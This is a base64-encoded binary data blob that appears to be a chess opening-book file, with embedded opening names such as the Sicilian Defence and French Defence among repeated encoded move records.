JaIhRoWv//AhRuWv//EhwAAP//Pi14Wjspflr//wEShFr//z0ijlr//wsTlFr//z0i2Fk5
Kppa//+aWSMqoFr//wscAAD//zYuslr//wELuFr//zw9vlr//wUExFr//zQtylr//yYt0F
r//z001lr//wIm3Fr//yMt4lr//xMV6Fr//x4V7lr//wMT9Fr//zoe+lr//wQGAFv//yQb
Blv//wsbDFv//wQGAAD//yMtGFv//wESHlv//zIqJFv//wMVKlv//x4VMFv//w8XNlv//z
kqEls6Hjxb//8GFUJb//9CaXNob3BzIE9wZW5pbmcALC4AAP//IzJiW///PD5oW///EiNu
W///NCx0W///Iyt6W///JR2AW///ARKGW///NSWMW///AxuSW///LSeYW///BAyeW///Hg
ykW///GgyqW///Oh6wW///Bwa2W///FQ68W///AhTCW///OzTIW///GyLOW///HBXUW///
CxvaW///UlskHOBb//8GFelb//8tI0xbPSLuW///BRr0W///AgsAAP//PD4EXP//BAYKXP
//OzQQXP//CBgWXP//MCgcXP//CxMiXP//OTMoXP//BhUuXP//PSs0XP//ARI6XP//Pi1A
XP//BRpGXP//OyOUWTIqrVo+Lf5bNSVMXP///lUcI1Jc//86LAAA//8GFWxc//89NHJc//
8dDXhc//80Ln5c//8LHYRc//8gKopc//8DC5Bc//8kHZZc//8NHZxc//87K6Jc//8SAahc
//8jG65c//8LE7Rc//8zI7pc//8aDMBc//8qIMZc//8FGsxc//85KtJc//8BEthc//85Kg
klNSXSKj4t9lM9IvlVMyNnXD403lz//0ZyZW5jaCBEZWZlbmNlAAA+NwAA//8WHQ5d//8m
HRRd//8OFhpd//82JiBd//8QGCZd//83Lyxd//8ZITJd//8rMjhd//8aIj5d//88PkRd//
8EBkpd//8+LVBd//8NHVZd//81JVxd//83LwAA//8CCWhd//88Pm5d//8JGXRd//8+LXpd
//8NHYBd//81JYZd//8JGWJdBAaMXf//OzOSXf//ARKcXf//MiqiXf//ChqoXf//KjSuXf
//PD4AAP//ARK6Xf//Fh/AXf//DA7GXf//FxbMXf//DRXSXf//HxfYXf//NiYAAP//CRnk
Xf//ODzqXf//ARLwXf//PD72Xf//DhbeXQ0V/F3//z4tAl7//w8GDF7//zsfEl7//wYPGF
7//ysPHl7//xojJF7//xkTKl7//zw+AAD//w0VNl7//z4tPF7//w8GQl7//zsfSF7//wYP
Tl7//ysPVF7///5cCBAwXhoiWl7//yoZY17//zIrAAD//xorcl7//zszeF7//zg8AAD//w
ILhF7//zsril7//wILfl4aK5Be//88PpZe//8BEqBe//8+LaZe//8LGqxe//8jGrJe//8K
Grhe//82Lr5e//8MFcRe//8cFcpe//8KGmxeDRXQXv//NSXWXv//EwQAAP//BQbmXv//Hx
fsXv//JRQAAP//Iiv4Xv//NCX+Xv//DhbyXhIDBF///x4fCl///wwFFF///zMeGl///yUN
AAD//wcFJl///zMlLF///xwVAAD//wIHOF///ysPPl///wcCRF///xMCSl///wESIF8PFz
JfDRVQX///OzNWX///BAxkX///GRNqX///MiIAAP//GiJwXwQGdl///yoZfF///yERhl//
/zAojF///zsfAAD//xIgmF///zQjnl///w0UpF///x0Uql///xoSsF///yogtl///ygavF
///zkpwl///zEoyF///zg5zl///xoj1F///yUd2l///woa4F///zUl5l///wgQ7F///zw+
8l///woakl8hMfhf//8+NP5f//8zHgAA//8hMQ5g//82LRRg//8cLRpg//87MyBg//8MIS
Zg//8+LSxg//8LHDJg//8lHDhg//8VHD5g//8KAERg//8EA0pg//8ZClBg//8tHgAA//8M
FVxg//8rM2Jg//8cJGhg//84PG5g//8UHHRg//87K3pg//8cK4Bg//88PoZg//8LHIxg//
8lHJJg//8VHJhg//8+LZ5g//8NFaRg//8KAKpg//8EA7Bg//8ZCrZg//8rFgAA//8NBsJg
//8ZE8hg//8MDc5g//8nF9Rg//8DDNpg//8uJ+Bg//8OFuZg//88Luxg//8MGvJg//87PP
hg//8NFf5g//88PgRh//8BEgph//8+LRBh//8ACgAA//8UHBxh//8KACJh//8VJShh//8+
LS5h//8MFTRh//8cFTph//8NFUBh//8ZCkZh//8NFVZgARK8YAQDFmEEBkxh//81JVJh//
81JWNe//8aI2RhBAZqYf//KhlwYf//CBC0XQQG4F4MIQhgChp6Yf//PSuAYf//AwySYf//
HgyYYf//PTYAAP//AgmkYf//Ni6qYf//CRGwYf//Pi22Yf//AgkAAP//PTbCYT4vAAD//w
kRyGH//zYu0mH//yQlvGEEBthh//81Jd5h//8LFehh//8cHe5h//8NHfRh//88Ovph//8E
AgAA//81JQZi//8BEgxi//82JBJi//8aIxhi//89Nh5i//8KGiRi//82Lipi//8CCTBi//
88OjZi//8BCwBiCRE8Yv//OzRCYv//AwxMYv//HgxSYv//PSsAAP//BAZeYv//OzNkYv//
AgtqYv//Pi1wYv//Hgx2Yv//NSV8Yv//ARKCYv//MiqIYv//ChqOYv//Ni6UYv//Ax6aYv
//JB6gYv//GyRYYgwepmL//yokrGL//wELAAD//yYuvGL//w0dwmL//zsmyGL//x4MzmL/
/z4v1GL//wMe2mL//yce4GL//wwe5mL//zcn7GL//xULnmEVJLZiFQbyYv//JBz4Yv//Pi
0AAP//EhgAAP//PjQSY///AwwYY///MioeY///AxEMYwILJGP//yojKmP//xojNGP//z8v
OmP//wESQGP//zcnRmP//woaTGP//zwzUmP//yQzWGP//z0rXmP//xQcAAD//yUzamP//y
QzcGP//yYldmP//wESfGP//z4tgmP//wMViGP//xwdjmP//zM0AAD//xgqmmP//z4toGP/
/xsjpmP//yMlrGP//wESsmP//yYjuGP//xojvmP//zwzxGP//w4WymP//y8u0GP//yQz1m
P//z0r3GP//wMY4mP//wMYAAD//zwz7mP//yQz9GP//z8v6GM9K/pj//8NHZRjChoAZP//
NycKZP//DhZkYwQFFGT//zsmGmT//xUkJGT//zEqKmT//z08AAD//wESNmT//yMrPGT//x
orQmT//zw+SGT//wMTTmT//xwTVGT//wUTWmT//xkTYGT//xQbZmT//yYjbGT//wsacmT/
/yIbeGT//xojfmT//zIihGT//wcGimT//z0rkGT//w4WlmT//yoZnGT//woaomT//z4tqG
T//yEFrmT//zsmtGT//yEqMGQVC7pk//8eM8Bk//8PF8pk//8kHNBk//82LgAA//8EAtxk
//8kKuJk//8BC+hk//86Oe5k//8DCvRk//8yIvpk//8KEgBl//88OgZl//8KEgAA//8kKh
Jl//8DCgAA//88Oh5l//8KEiRl//8yIipl//8jGwAA//8CCQxlFR0YZQIQMGUKGjZl//87
NDxl//8CCwAA//87I1Rl//8DI1pl//8zI2Bl//8VI2Zl//89GWxl//8BEnJl//8tI3hl//
8aI35l//88OoRl//8KGopl//87M5Bl//8MFZZl//8kKpxl//8JEU5lFR2iZf//Pi2oZf//
KiwAAP//EBi4Zf//Ojm+Zf//ABvEZf//EirKZf//AwDQZf//PDrWZf//AAjcZf//KhLiZf
//CRLoZf//GRLuZf//CBD0Zf//Myr6Zf//DhUAZv//JBUGZv//AgkMZv//PRkSZv//CREY
Zv//OzMeZv//AQskZv//Pi0qZv//DhWyZQwVMGb//x4VNmb//wMRAAD//zsjRmb//wILTG
b//zg7Umb//wQGWGb//x4lXmb//w8XZGb//zs0amb//wUMcGb//zw+dmb//xojfGb//z0i
gmb//woaiGb//z4tjmb//wsVlGb//yQVmmb//wUMQGYBC6Bm//8qJKZm//8FDAZjBSHWZB
sksGb//zoetmb//zcnAAD//xQcymb//zw60Gb//w4W1mb//zsr3Gb//wQG4mb//z406Gb/
/wwV7mb//zYk9Gb//xUk+mb//z02AGf//wsVBmf//x4VDGf//wUMEmf//zoeGGf//wYVHm
f//zYuJGf//zw6AAD//wELMGf//zs0Nmf//wMKPGf//yUuQmf//wUTSGf//xkrTmf//woS
VGf//z0ZWmf//wIJYGf//zolZmf//wkRbGf//z4tcmf//w4VeGf//yQVfmf//zIqAAD//w
wVimf//yQVkGf//wYVlmf//z4tnGf//wELKmcGFYRnBQyiZ///KiSoZ///HBMAAP//Fh68
Z///JRzCZ///DRXIZ///JifOZ///BAzUZ///KxnaZ///FBzgZ///MSrmZ///HA7sZ///Oi
XyZ///Chz4Z///LRz+Z///GREAAP//BwYKaP//HhUQaP//DxcWaP//LSMcaP//EQMiaP//
CAAoaP//ChEuaP//OAg0aP//Aws6aP//Oh5AaP//CwRGaP//JiFMaP//EgFSaP//IRlYaP
//BAJeaP//MSpkaP//AgtqaP//PTxwaP//EhwEaAYMdmj//zw+fGj//wEShmj//z0rjGj/
/wMKkmj//z4tmGj//w4Wnmj//zsmpGj//yMqqmj//yghsGj//zYmAAD//xojvGj//z4twm
j//zYuAAD//x0nzmj//y8n1Gj//wMn2mj//yoj4Gj//wESyGgaI+Zo//8mL+xo//8PH/Zo
//89K/xo//8PDQAA//8EAghp//8lHg5p//8GHhRp//8tHhpp//8CCyBp//8+LSZp//8BEi
xp//81JTJp//8qCjhp//86Mz5p//8YKkRp//84OUpp//86MwAA//8AAlZp//84OVxp//8I
EGJp//80Kmhp//8jKm5p//8PK3Rp//8CC3pp//81JYBp//8BEoZp//8+NIxp//8DGFBpAw
qSaf//Dg+Yaf//Bwaiaf//Jg6oaf//HxcAAP//Fga0af//Jx+6af//AgvAaf//NyfGaf//
BhbMaf//NSXSaf//ARLYaf//PjTeaf//GiPkaf//Dg/qaf//Bwbwaf//Jg72af//GCD8af
//OjMCav//DB0CaRojrmkDGAhq//87Jg5q//8sPgAA//8XJiJq//88PShq//8aGC5q//8z
LDRq//8GFzpq//8/L0Bq//8PH0Zq//83J0xq//8OFlJq//8tHlhq//8BEl5q//89K2Rq//
8jGmpq//8+LXBq//8qI3Zq//86M3xq//8KKoJq//8qI4hq//8aI45q//81JZRq//8GDBxq
Awqaav//MSqgav//FCYAAP//Pzawav//HBS2av//OD28av//ChzCav//Pj/Iav//HjbOav
//AxTUav//Bh7aav//DQPgav//GT3mav//HA3sav//Cxnyav//LRz4av//Ehz+av//Oh4E
a///BAIKa///PD4Qa///AgsWa///PRkca///BAIAAP//JS4oa///Agsua///OiU0a///GA
o6a///ODlAa///AwoiawMYRmv//z4tTGv//wESVmv//w4PXGv//wcGYmv//yYOaGv//yMq
bmv//yEYdGv//wYMemv//zsmgGv//wYMAAD//yw6jGv//xgikmv//z8nmGv//xIYnmv//z
IrpGv//w8Xqmv//ycfsGv//wMKtmv//zosvGv//woRwmv//zcnyGv//wACzmv//ysy1Gv/
/yky2mv//xMC4Gv//xgK5mv//zw97Gv//yEp8mv//z0r+Gv//wQF/mv//xkTBGz//wgQCm
z//z4tEGz//wESFmz//yoZHGz//xojhmsaISJs//8xIShs//8aI7ZoISqqaiEYMmz//zAo
OGz//y8eAAD//w8fTGz//yY0Umz//xIMWGz//x4MXmz//wYMZGz//zUlamz//wEScGz//z
89dmz//xA9fGz//z4vgmz//wIQiGz//zw6jmz//wMLlGz//zoemmz//yEFoGz//zsmpmz/
/z0rAAD//w4Vsmz//xwVuGz//wYMvmz//zIqxGz//xgKymz//ygh0Gz//wES1mz//yoZ3G
z//xoh4mz//zEh6Gz//yEY7mz//zAo9Gz//woa+mz//z4tAG3//wsVAAD//yMbDG3//xQc
Em3//zsjGG3//wMMHm3//xUMJG3//wolKm3//xwVMG3//w0VNm3//zMlPG3//xgKQm3//z
EhSG3//zw+AAD//wILVG3//xkLWm3//wQGYG3//z0ZZm3//wgQTm0YCmxt//8jGnJt//8K
Gnxt//8+LYJt//8BC4ht//86M45t//8hGJRt//8wKJpt//8XHQAA//8uH6Zt//8GF6xt//
80LrJt//8hDLht//8yKr5t//8EAsRt//8qNMpt//8CCdBt//88PtZt//8BEtxt//8+LeJt
//8JEeht//89K+5t//8KGkZsCRGsbA0VBm0GDKBtAwv0bf//JBz6bf//NCMAAP//BgwWbv
//PTwcbv//ETEibv//PD4obv//GBEubv//OjM0bv//Axg6bv//Pi1Abv//BRpGbv//KjRM
bv//CRJSbv//GRJYbv//ARJebv//PRlkbv//GyNqbv//Ixpwbv//FBt2bv//JBt8bv//Oz
MAAP//MRmIbv//KiSObv//ITGUbv//MCiabv//GySgbv//KySmbv//DCGsbv//PSuybv//
Awy4bv//Hgy+bv//FSTEbv//JBzKbv//BQzQbv//Oh7Wbv//BhXcbv//Pi3ibv//BhXEZh
sktmcFIRBuChqCbgoS6G7//zkq7m7//wsbBG////5cMyMKb///U2ljaWxpYW4gRGVmZW5j
ZQAAOxsAAP//BRUqb///LBwwb///FRs2b///Khs8b///GSFCb///DAlIb///DQZOb///HA
xUb///BwVab///FAVgb///Dxdmb///Myxsb///BA1yb///PBx4b///CxV+b///HhWEb///
GguKb///IxSQb///DRSWb///KRScb///Exyib///JByob///Cxqub///Pzy0b///Agm6b/
//IinAb///CRnGb///IhoAAP//KyzSb///GiLYb///NCveb///Aibkb///PTTqb///IjPw
b///CgD2b///GBr8b///ExcCcP//HCIIcP//Pj0OcP//FT0UcP//OD0acP//BA0gcP//FA
omcP//BRUscP//MxMycP//BwU4cP//PQU+cP//CxxEcP//NS5KcP//Hy5QcP//IxRWcP//
DRRccP//IhRicP//FR9ocP//Jy5ucP//Dh50cP//Hid6cP//DxeAcP//PDrMbzw+hnD//w
wUjHD//zszlnD//wMYnHD//z0ionD//x4VAAD//w4HrnD//x8etHD//wcOunD//y4OwHD/
/wYHxnD//y0uzHD//x0k0nD//ysk2HD//xUd3nD//zQr5HD//xok6nD//yok8HD//xIk9n
D//z0t/HD//wsSAnH//y0fCHH//wILDnH//z4/FHH//wQGGnH//zw+IHH//wUOJnH//yst
LHH//wsaMnH//z00OHH//zEoPnH//zg5RHH//w4VSnH//x4VUHH//wELVnH//yMpXHH//x
ExYnH//z0tAAD//wQGbnH//zw+dHH//wUOenH//z0rgHH//w4VhnH//x4VjHH//zEoknH/
/xIYAAD//zg5mHEwKJ5x//8BEqRx//8qOwAA//8LEbRx//8lHbpx//8fJ8Bx//8tL8Zx//
8FDMxx//89LdJx//8MFQAA//8pOd5x//8HBeRx//80Iupx//8FDPBx//8VFvZx//8YHPxx
//8tFQJy//8NFAhy//8dFA5y//8LEhRy//85KRpy//8aKSBy//8jKSZy//8CCyxy//8lHT
Jy//8oGDhy//89LT5y//8oGthxCxpEcv//Pj9Kcv//AQtUcv//PD5acv//JR8AAP//GxNm
cv//NCVscv//Axtycv//JBt4cv//DRR+cv//HRSEcv//ExuKcv//KjSQcv//BQOWcv//Pj
+ccv//IRGicv//MCiocv//KCGucv//NCu0cv//Ehy6cv//PD7Acv//BAbGcv//JR3Mcv//
BQ7Scv//IynYcv//BgUAAP//NCLkcv//BAzqcv//NS7wcv//HSb2cv//PjX8cv//BwYCc/
//NiYIc///DR0Oc///GhwUc///Agsac///Khogc///HSQmc///KSosc///Exoyc///LBo4
c///KBo+c///OSlEc///CRJKc///MyxQc///DipWc///IxJcc///ARJic///PTtoc///FR
1uc///CSQAAP//AAh6c///AgmAc///DxaGc///HxaMc///JBaSc///Lx+Yc///IySec///
KjSkc///GiOqc///PD4AAP//IjK2c///Lia8c///IyLCc///KjTIc///Fx7Oc///AgnUc/
//GiPac///Ky+wcysu4HP//zYz5nP//xQC8HP//wY29nP//yYU/HP//wcGAnT//zQmCHT/
/w0UDnT//x0UFHT//ygaGnT//zMrIHT//wIJAAD//x0ULHT//w4VMnT//xwVOHT//xMjPn
T//yQcRHT//wMTSnT//ygYUHT//wUDVnT//ykoXHT//wAIYnT//zMTaHT//wkSbnT//yMS
dHT//wESenT//zw+gHT//ygYhnT//yk6AAD//zA5knT//zMlmHT//xUdnnT//zMXAAD//w
AGqnT//x0UpHQmBrB0//8NFLZ0//8lFMB0//8oMMZ0//80Jcx0//8EHNJ0//8qNNh0//8O
B950//8nJuR0//8HD+p0//8vLvB0//8PF/Z0//8lJ/x0//8FBAJ1//89JQh1//8MBg51//
85PRR1//8CCRp1//8kHSB1//8UHSZ1//8tLyx1//8JGTJ1//89LTh1//8GBz51//80K0R1
//8SDEp1//8jKVB1//8BElZ1//85KYx0PD5cdf//DhcmdAQGYnX//zw+dHMlHWx1//8FDn
Z1Dx9gcgES3nL//z00gHX//w4VjnX//zIkAAD//xIamnX//zMyoHX//wILpnX//z4/rHX/
/x0ksnX//zw+uHX//yggvnX//zkpxHX//xUdynX//zIi0HX//w8f1nX//z003HX//wUM4n
X//yok6HX//w4V7nX//x4V9HX//xsiAAD//zQmAHb//wIJBnb//zk9DHb//wU9Enb//zIi
GHb//wcFHnb//z4/JHb//wUaKnb//zw+MHb//xMcNnb//z00PHb//xIbQnb//yobSHb//x
Mc+nUVG052//8oGAAA//89NF52//8OFWR2//8kHFR2HhVqdv//CRJwdv//IxJ6dv//DRSA
dv//HRSGdv//KBgAAP//IxmSdv//EBmYdv//PRmedv//DRSkdv//HRSqdv//ARKMdgkZsH
b//z0NAAD//wELwHb//xUHxnb//xwTzHb//wMV0nb//x0c2Hb//zw+3nb//xwk5Hb//z0r
6nb//xUd8Hb//zMD9nb//wwV/Hb//yMdAnf//wQMCHf//yQVDnf//xMcFHf//yUcGnf//y
ggIHf//zkpJnf//xUcLHf//yokMnf//w4VOHf//x4VPnf//xgcAAD//yokSnf//wQGUHf/
/yM1Vnf//wESXHf//zMjYnf//xojaHf//z4/bnf//wUadHf//zw+enf//ygYgHf//wEQAA
D//xMKjHf//wMKknf//xkKmHf//wsannf//zMTpHf//ycDqnf//zYusHf//yAntnf//yQa
vHf//wUawnf//yMZyHf//xAZznf//z0Z1Hf//zgg2nf//zw14Hf//zA45nf//zkp7Hf//y
gw8nf//x4n+Hf//w8X/nf//xsjAAD//xwWCnj//woUEHj//wYHFnj//zMbHHj//wABInj/
/xsKKHj//xoFLnj//xQFNHj//xIcOnj//z4/QHj//wwaRnj//yobTHj//wESUnj//yMUWH
j//w0WAAD//zk9ZHj//wYNanj//xQNcHj//wsFdnj//ycDfHj//wUNgnj//z0NiHj//ygq
jnj//zk9AAD//wYHmnj//z4/oHj//yojpnj//z0NrHj//yo7AAD//zI6uHj//zU8vnj//z
oyxHj//z01ynj//yg60Hj//z491nj//wU93Hj//zkJ4nj//w0U6Hj//yMU7nj//zkpAAD/
/wIU9HgoKvp4//8fHAB5//8CFAAA//8qJBB5//8BEhZ5//8cFBx5//8ACCJ5//8UCih5//
8GDy55//89BTR5//8MBTp5//8dBUB5//8LEUZ5//8fHUx5//8oDFJ5//85PVh5//8FPV55
//8jFGR5//8oKrJ4CxwKeQ0Uann//x4fcHkeJ5R4//8PF355//8zHoh5//8NFF54DB6Oef
//PD6Uef//ARIAAP//CgCkef//Bgeqef//CwUAAP//PQW2ef//Bge8ef//KyKweSsbwnn/
/w0GyHn//xwrAAD//ysu2Hn//wId3nn//yYd5Hn//wsc6nn//wscAAD//zYm8Hk/PfZ5//
8FHfx5//8bKwZ6//8NFgx6//88PtJ5KxsSev//BA0Yev//FAoiev//BwUoev//GwwAAP//
ChI0ev//Khs6ev//AwpAev//LBoAAP//GApMev//OxtSev//AgtYev//PTxeev//BwVkev
//OTtqev//ARJwev//Myx2ev//Cxx8ev//PD6Cev//KBiIev//FB6Oev//AwSUev//ChSa
ejMeRnr//wQDoHr//zMrLnoUCqp6//8MHrB6//8jFLp6//8EBp55DRTAev//IhTGev//BA
0AAP//KhvWev//BRPcev//Hiziev//HCzoev//Myzuev//Ghz0ev//IxT6ev//DRQAe///
IhQGe///AyMAAP//PSUSe///DhYYe///Mx4ee///GCEke///KSEqe///BQMwe///HBU2e/
//CxU8e///HhVCe///BAZIe///PD5Oe///KBhUe///OSlae///DBUAAP//FAJme///BAxs
e///PRVye///DhV4e///GxV+e///CxWEe///PD6Ke///BROQe///KhuWe///ARKce///Hi
yie///HCyoe///Myyue///GBy0e///IhS6e///DRTAe///IxTGe///KBjMewUhYHsFDNB6
KBoMe///PTSGdyokBHg9ItJ7//8VC+R7//8lHPJ7//8PF0R3Exz4e///HhWUdSUdtnYkHP
57//8xKAh8//8jKa5xODkWfP//ETEcfP//AAUAAP//LCYsfP//FRwyfP//Mis4fP//CQ4+
fP//DQ5EfP//DBVKfP//NQ1QfP//JCtWfP//LhxcfP//EiRifP//OyxofP//BQZufP//Kj
t0fP//BAV6fP//Pj+AfP//CxKGfP//MSmMfP//AguSfP//IiuYfP//CxyefP//KyKkfP//
HCKqfP//MyKwfP//AQC2fP//OD28fP//Bg7CfP//PTXIfP//HibOfP//NS7UfP//FQvafP
//KTPgfP//CgnmfP//LDTsfP//AAHyfP//Lyz4fP//Cxz+fP//PD4Eff//CREKff//JzUQ
ff//Fx4Wff//JR4cff//Dh4iff//Hicoff//BwYuff//LS80ff//Dxc6ff//PStAff//BQ
xGff//MCBMff//EQpSff//Oy1Yff//AQteff//CREAAP//PTRqff//BAJwff//Nyd2ff//
DBV8ff//HhWCff//DxeIff//NiaOff//AguUff//PDqaff//EQqgff//Oy2mff//BQysff
//Iymyff//KiAAAP//ARK4fRExvn3//zsraHE7MyZ8IylkfTAoxH3//xMBAAD//z494H3/
/wwT5n3//xwT7H3//xQl8n3//y0l+H3//yEl/n3//yQcBH7//xohCn7//xshEH7//xEaFn
7//yobHH7//xoUIn7//y8UKH7//wIULn7//yMUNH7//w0UOn7//x0UQH7//woRRn4KCQAA
//8lHUx+//8BIVZ+//8oIVx+//8ZIWJ+//8/Pmh+//8LGm5+//8lHQAA//8LGnp+//8nH4
B+//8BIYZ+//8oIYx+//8ZIZJ+//8KEAAA//8EA55+//8bCqR+//8cLap+//8qG7B+//8L
HLZ+//8dFLx+//89GQAA//8LGsh+//86Oc5+//8WHgAA//83L9p+//8GDeB+//8vNuZ+//
8eNux+//8tNvJ+//8yNvh+//8uL/5+//8ZHgR///8+Ngp///8BGRB///8mLRZ///8NLRx/
//81LiJ///8iMih///80NS5///8jIjR///8zNDp///84I0B///89IkZ///8jNUx///8rLV
J///8VI1h///86M15///8qOGR///8bK2p///8SKnB///8xOnZ///8eFXx///8uJoJ///8a
Eoh///86MY5///8VHpR///87G5p///8CJqB///8jEqZ///8KGqx///8hGbJ///8QGLh///
8/Pr5///8MFcR///8tLsp///8FDdB///8UDdZ///8EBtx///8dFOJ///8PFuh///8eFu5/
//8ZIPR///8qIPp///8aIACA//8xIQaA//8ZIcJ+DB7UfgsaDID//z0vdH43J5h+JR0SgP
//KgoAAP//AgsugP//Kyo0gP//CxE6gP//OytAgP//IgJGgP//MSlMgP//AglSgP//JBtY
gP//CRtegP//KhtkgP//CiJqgP//IxRwgP//DRR2gP//LxR8gP//IxIAAP//ISiIgP//NC
OOgP//ExGUgP//PiaagP//EROggP//HBOmgP//GSGsgP//JRyygP//BAa4gP//JBu+gP//
CRvEgP//KhvKgP//ChHQgP//IzTWgP//FBzcgP//LSzigP//DhbogP//HRQAAP//BAL0gP
//JB36gP//Fh0Agf//JR0Ggf//DhYMgf//Pz7ugC0sEoH//z4uAAD//wABIoH//yQdKIH/
/xQdLoH//y00NIH//wscOoH//yUdQIH//yIhRoH//yMSAAD//wwDUoH//y0kWIH//wQMXo
H//zwMZIH//wsRaoH//yQbcIH//xQbdoH//yobfIH//yIhgoH//z8+TIE/PIiB//8KIo6B
//8oIZiB//8EAoKACxoYgRkhnoH//z0vpIH//wABIIACCbKB//8KEQAA//86M8KB//8GPs
iB//88DM6B//8FDNSB//8kDNqB//8HBuCB//8hJOaB//8JCuyB//8jIfKB//8YIfiB//8v
Kv6B//8KCwSC//8SIQqC//8QGBCC//87IxaC//8CCRyC//8tLyKC//8DAiiC//8jEi6C//
8EAzSC//8/PDqC//8CL0CC//8kG0aC//8UG0yC//8qG1KC//8ZIViC//89L16C//8MBWSC
//8eFWqC//8OFXCC//8dFXaC//8LGnyC//8wKLiBJR2Cgv//FQuIgv//Jh6Sgv//IxQAAP
//GiSegv//LSSkgv//CSSqgv//KySwgv//BAW2gv//FA28gv//GyTCgv//HRTIgv//ExvO
gv//JR3Ugv//Cxragv//Ojnggv//Agnmgv//KjTsgv//GSHygv//Oz4AAP//Agv+gv//Ew
sEg///EgMKg///OjkQg///KjEWg///PSIcg///ISoig///Hi4og///DA0ug///HBM0g///
DRU6g///Ph5Ag///EhwAAP//KjRMg///AAhSg///Oz5Yg///DR1eg///Ph5kg///FR5qg/
//PStwg///HBV2g///HRV8g///FR5GgxUcgoP//yQciIP//xwSkoP//yMSmIP//woMnoP/
/y8XpIP//wYHqoP//z8+sIP//wwVtoP//x4VvIP//z02AAD//w0MyIP//yQdzoP//xQd1I
P//wwd2oP//wYN4IP//xsM5oP//wIU7IP//y8U8oP//wsU+IP//yob/oP//woLBIT//yMU
CoT//w0UEIT//x0UFoT//xUeHIQZIcKD//8mHiKE//8EBiyE//8tLzKE//8LHDiE//8lHT
6EPSv4gv//CxWYgg4VRIT//x4VToT//wkZWIT//zYmXoT//wELZIT//zw6aoT//yc1AAD/
/xk0doQ4PQAAFw8AAP//Bg18hP//Fg2KhP//Dg2QhP//HxeWhP//DCechP//PQ2ihP//Dw
6ohP//HhauhP//BQa0hP//PD66hP//Bw/AhAscAAD//z0ZxoT//wQF0IT//y0f1oT//w0U
3IT//zYuAAD//wMM6IT//z897oT//wIL9IT//zUj+oT//xIjAIX//z00BoX//wESDIX//z
w6EoX//xwOAAD//x8tHoX//xgcJIX//yMpKoX//xwWMIX//yYeNoX//wELPIX//zYmQoX/
/wMYSIX//zw6ToX//x4VGIUeDFSF//83J1qF//8MHmSF//8nNWqF//8LHHCF//8EDAAA//
8ZE3yF//8ME4KF//8dE4iF//8KGI6F//8qGZSF//8QGZqF//8jHaCF//8HD6aF//8/PayF
//8BErKF//89GbiF//8DCr6F//88OsSF//88PgAA//8hDNCF//8yKtaF//8xIdyF//8qO+
KF//8RMeiF//8jLe6F//8THPSF//8uHPqF//8DEQCG//89NAaG//8MHgyG//8tHxKG//8X
HsqFCxwYhv//IxTihC0fdoUnLh6G//8VCyiG//8lHjaG//8OHjyG//8eJ0KG//8DCnCEDx
dIhv//Oy1Ohv//PSwAAP//JS9ehv//Mz1khv//NCVqhv//KSJwhv//OTh2hv//LTN8hv//
OjmChv//DB6Ihv//IyGOhv//HC2Uhv//OyOahv//FCmghv//Limmhv//BAashv//KjSyhv
//AhS4hv//Ly6+hv//ESnEhv//MinKhv//ISnQhv//HRTWhv//DRbchv//Hhbihv//BQzo
hv//Iynuhv//ChH0hv//LS/6hv//CxwAh///JR0Gh///FQsMh///Jh4Sh///ASEYh///KC
Eeh///GSEkh///NiYqh///CxUwh///HhU2h///AAE8h///HhUAAD0ZAAAqGQAA//8FDEiH
//8vFFaH//8NFFyH//8jFGKH//8THGiH//8tL26H//8CCXSH//8wKEKHJBx6hz0ZAAA9Kw
AA//8JGYCH//88OpKH//8DCpiH//87LZ6H//8nFQAA//8xKKqH//84ObCH//8RMbaH//87
M7yH//8MBAAA//8OFciH//8nFc6H//8LFdSH//82LdqH//8FBuCH//8VDOaH//8JLeyH//
8cFfKH//8EBfiH//8rFv6H//8NFASI//8jFAqI//8CCRCI//8kHBaI//8JGRyI//89KyKI
//8BCyiI//88Oi6I//87MwAA//8DHjqI//8nHkCI//8MHkaI//88OkyI//8VJlKI//8tNF
iI//8LHF6I//8lHmSI//8OHmqI//89InCI//8DCjSIAQt2iP//Oy18iP//AxHChwUMhoj/
/x4njIj//wQGAAD//zstnIj//xUnooj//z4/qIj//wUaroj//yobtIj//wgLuoj//yMSwI
j//wESxoj//y0SzIj//xwV0oj//z082Ij//wAI3oj//zQt5Ij//x4c6oj//wY2AAD//zQf
9oj//zAo/Ij//z01Aon//w4VCIn//yQqDon//wsNFIn//x4NGon//zIwIIn//zk6Jon//w
cGLIn//y0eMon//zEyOIn//zg5Pon//wIJRIn//yssSon//xwxUIn//yMtVon//wgLXIn/
/zw+Yon//x4caIn//yokbon//wAIdIn//zw+8Ig7K3qJ//8cHoCJ//89NIqJKiQAAP//Ch
yQif//HiUAAP//Bgegif//Ky6mif//BAasif//KiSyif//Egq4if//PTS+if//BRrEif//
NCvKif//ChLQif//IxLWif//PzwAAP//Ix0AAP//AAjoif//Ojnuif//HB70if//Ji36if
//Dx8Aiv//PzwGiv//AgniiRAZDIr//z0ZEor//wocHIr//zQmIor//wQMKIr//x4MLor/
/y0cAAD//xkiOor//zQiQIr//woiRor//z02TIr//wIJUor//zYmWIr//yEFXor//zAoZI
r//xwKaor//yMtcIr//wocdor//yokfIr//yMZAAD//wsciIr//zQcjor//yMZAAD//woc
AAD//zQmoIr//w0Upor//x4VAAD//xEDsor//xQDuIr//xoRvor//yMUxIr//w0Uyor//x
0U0Ir//wQC1or//ysd3Ir//xwa4or//z886Ir//wEL7or//yYn9Ir//wsV+or//z0rAIv/
/x4lAAD//wocBosKEQyL//8jFKyKNCYSi///ARLciQUMNIoFIYKKChyUigIJHIsLHJqK//
88OiaL//8VC0CL//8LGgAA//88PkyL//8CCVKL//89NFiL//8FDl6L//8VDmSL//8BC2qL
//8xKXCL//8hKnaL//8cFXyL//8ZIYKL//8cFZqJOzRGiyMtiIv//wMKjov//yUcnIv//x
Mcoov//yQcqIv//wMRzn0FDFiGAQukhw8XlogJGa6L//81JbSL//8BC6hwDBTKi///NCYA
AP//PTzai///AATgi///FQTmi///LDTsi///IRPyi///Fw74i///JiH+i///BQAEjP//ED
gKjP//MjUQjP//HxUWjP//DhccjP//FR8ijP//Bg4ojP//HxUujP//DxY0jP//HRY6jP//
AjJAjP//JBtGjP//DhZMjP//OyZSjP//FRtYjP//Lh9ejP//GSFkjP//OBBqjP//EBlwjP
//IBl2jP//AxF8jP//KCCCjP//DAOIjP//MBuOjP//CRuUjP//KhuajP//ESygjP//Pj+m
jP//AxGsjP//LBGyjP//CxG4jP//Oiy+jP//AALEjP//NC7KjP//AQvQjP//IzTWjP//FB
zcjP//JR3ijP//AgnojP//NSXujP//CRn0jP//BgcAAP//KjQAjf//GSEGjf//JR0Mjf//
